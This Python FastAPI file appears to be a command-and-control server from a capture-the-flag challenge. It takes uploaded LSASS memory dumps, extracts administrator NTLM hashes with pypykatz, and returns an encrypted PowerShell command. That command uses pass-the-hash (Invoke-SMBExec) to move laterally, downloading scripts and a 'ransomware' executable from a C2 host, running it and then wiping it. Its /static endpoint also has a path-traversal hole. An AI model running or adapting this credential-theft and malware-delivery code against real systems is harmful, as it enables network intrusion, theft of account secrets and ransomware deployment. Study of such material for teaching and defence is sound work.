import base64
import json
import os
import subprocess
import uuid
import uvicorn
import requests

from fastapi import FastAPI, File, UploadFile
from fastapi.responses import FileResponse
from starlette.staticfiles import StaticFiles

from settings import UPLOAD_DIR, STATIC_DIR, SECRETS_LOCATION
from rc4 import encrypt

os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

KEY = requests.get(SECRETS_LOCATION + "/key").text[1:-1]


RANSOMWARE = "powershell.exe -NoP -sta -NonI -W Hidden -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBpAG4AZgBlAGMAdABlAGQALQBjADIALgBjAHMAYQB3AC4AaQBvAC8AcwB0AGEAdABpAGMAPwBmAGkAbABlAD0AcgB1AG4AcwAwAG0AZQB3AGgAZQByAGUALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHIAdQBuAHMAMABtAGUAdwBoAGUAcgBlAC4AZQB4AGUAIgA7AEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgB1AG4AcwAwAG0AZQB3AGgAZQByAGUALgBlAHgAZQA7AFMAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXAByAHUAbgBzADAAbQBlAHcAaABlAHIAZQAuAGUAeABlACIAIAAtAFYAYQBsAHUAZQAgACgAJwAwACcAKgAoACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHIAdQBuAHMAMABtAGUAdwBoAGUAcgBlAC4AZQB4AGUAIgApAC4ATABlAG4AZwB0AGgAKQApADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgB1AG4AcwAwAG0AZQB3AGgAZQByAGUALgBlAHgAZQAiADsA"
LATERAL_MOVEMENT = "New-Module -Name LaTm0v -ScriptBlock ([Scriptblock]::Create((New-Object " \
                   "System.Net.WebClient).DownloadString(\"http://infected-c2.csaw.io/static?file=lat.ps1\"))); " \
                   "Invoke-SMBExec -Target \"{ip}\" -Domain \"{domain_name}\" -Username \"{username}\" -Hash \"{" \
                   "ntlm}\" -Command \"{ransomware}\""

app = FastAPI()


@app.get("/health_check")
async def health_check():
    return "OK"


@app.post("/process_minidump")
async def process_minidump(ip: str, file: UploadFile = File(...)):
    filename = f"{uuid.uuid4()}.dmp"
    file_path = os.path.join(UPLOAD_DIR, filename)
    with open(file_path, "wb") as f:
        f.write(file.file.read())
    # Run the command and capture the output
    try:
        command = ["pypykatz", "lsa", "minidump", file_path, "--json"]
        data_string = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)
        data_string = "".join(data_string.split("\n")[1:])
        data_dict = json.loads(data_string)
        found_users = []
        for _, data in data_dict.items():
            for _, session in data.get('logon_sessions', {}).items():
                sid = session.get('sid', "")
                username = session.get('username', "").strip()
                msv_creds = session.get('msv_creds', [])
                domain_name = session.get('domainname', "")
                if sid.startswith("S-1-5-21-") and "admin" in username.lower() and username not in found_users and len(msv_creds) > 0:
                    found_users.append(username)
                    ntlm = msv_creds[0].get("NThash", "")
                    to_encode = LATERAL_MOVEMENT.format(ip=ip, domain_name=domain_name, username=username, ntlm=ntlm, ransomware=RANSOMWARE)
                    response = "powershell.exe -NoP -Enc " + base64.b64encode(to_encode.encode("utf-16")[2:]).decode()
                    return base64.b64encode(encrypt(key=KEY, plaintext=response))
    except subprocess.CalledProcessError as e:
        pass


@app.get("/static")
async def static(file: str):
    return FileResponse(STATIC_DIR + "/" + file)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080)
